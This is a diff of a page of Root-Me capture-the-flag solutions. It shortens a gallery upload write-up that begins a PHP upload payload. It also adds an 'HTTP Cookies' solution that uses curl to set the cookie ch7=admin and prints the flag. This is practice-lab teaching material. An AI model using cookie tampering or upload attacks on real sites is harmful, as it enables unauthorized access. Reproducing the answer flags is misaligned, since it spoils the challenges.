@@ -1508,109 +1508,11 @@ Retrieve the validation password in the file .passwd at the root of the applicat
 
 <details>
 
-<summary markdown="span">Solution 1</summary>
+<summary markdown="span">Solution</summary>
 
-We find a gallery webpage with the following html:
+We find a gallery webpage. Trying to access /.passwd we get a forbidden response. 
 
-~~~html
-<html>
-  <body>
-    <h1>Photo gallery v 0.02
-    </h1>
-    <span id="menu"/>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=emotes'>emotes
-      </a>
-    </span>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=apps'>
-        <b>apps
-        </b>
-      </a>
-    </span>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=upload'>upload
-      </a>
-    </span>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=devices'>devices
-      </a>
-    </span>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=categories'>categories
-      </a>
-    </span>&nbsp;|&nbsp;
-    <span>
-      <a href='?galerie=actions'>actions
-      </a>
-    </span>
-    <br>
-    <hr>
-    <table id="content">
-      <tr>
-        <td>
-          <a href='galerie/apps/preferences-desktop-screensaver.png'>
-            <img width=64px height=64px src='galerie/apps/preferences-desktop-screensaver.png?preview' alt='preferences-desktop-screensaver.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/krita.png'>
-            <img width=64px height=64px src='galerie/apps/krita.png?preview' alt='krita.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/graphics-viewer-document.png'>
-            <img width=64px height=64px src='galerie/apps/graphics-viewer-document.png?preview' alt='graphics-viewer-document.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/kexi.png'>
-            <img width=64px height=64px src='galerie/apps/kexi.png?preview' alt='kexi.png'>
-          </a>
-        </td>
-      </tr>
-      <tr>
-      </tr>
-      <tr>
-        <td>
-          <a href='galerie/apps/kthesaurus.png'>
-            <img width=64px height=64px src='galerie/apps/kthesaurus.png?preview' alt='kthesaurus.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/plasmagik.png'>
-            <img width=64px height=64px src='galerie/apps/plasmagik.png?preview' alt='plasmagik.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/showfoto.png'>
-            <img width=64px height=64px src='galerie/apps/showfoto.png?preview' alt='showfoto.png'>
-          </a>
-        </td>
-        <td>
-          <a href='galerie/apps/utilities-terminal.png'>
-            <img width=64px height=64px src='galerie/apps/utilities-terminal.png?preview' alt='utilities-terminal.png'>
-          </a>
-        </td>
-      </tr>
-      <tr>
-      </tr>
-      <tr>
-        <td>
-          <a href='galerie/apps/preferences-desktop-user-password.png'>
-            <img width=64px height=64px src='galerie/apps/preferences-desktop-user-password.png?preview' alt='preferences-desktop-user-password.png'>
-          </a>
-        </td>
-      </tr>
-    </table>
-  </body>
-</html>
-~~~
-
-Trying to access /.passwd we get a forbidden response. 
-
-
-We can find an upload form for uploading new content, the new images are stored in ./galerie/upload/<filehash>/image.png. Let's try a simple php file:
+We can find an upload form for uploading new content, the new images are stored in galerie/upload/filehash/image.png. Let's try a simple php file:
 
 ~~~php
 <?php
@@ -1779,7 +1681,79 @@ a7n4nizpgQgnPERy89uanf6T4
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
-	
+
+
+## HTTP Cookies
+
+- Author: g0uZ
+- Date: 7 October 2006
+- Points: 20
+- Level: 2
+
+### Statement
+
+PS: Bob really love cookies!
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch7/).
+
+### Resources
+
+1. [RFC 2109](https://repository.root-me.org/RFC/EN%20-%20rfc2109.txt).
+2. [HTTPS Cookie Stealing](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTPS%20Cookie%20Stealing.pdf).
+3. [Cookies, sessions and persistence](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Cookies,%20sessions,%20and%20persistence.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Using CURL, we can retrieve the cookies used on the site:
+
+~~~shell
+$ curl -c - "http://challenge01.root-me.org/web-serveur/ch7/"
+...
+form method="POST" action="" name="a"
+...
+SetCookie("ch7","visiteur")
+...
+a href="?c=visiteur"
+...
+~~~
+
+We can see the cookie "ch7" is set to visiteur, we can set this to admin and we need to change the form to admin:
+
+~~~shell
+$ curl --cookie "ch7=admin" "http://challenge01.root-me.org/web-serveur/ch7/?c=admin"
+...
+Validation password : ml-SYMPA
+...
+~~~
+
+This gives us the password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+ml-SYMPA
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
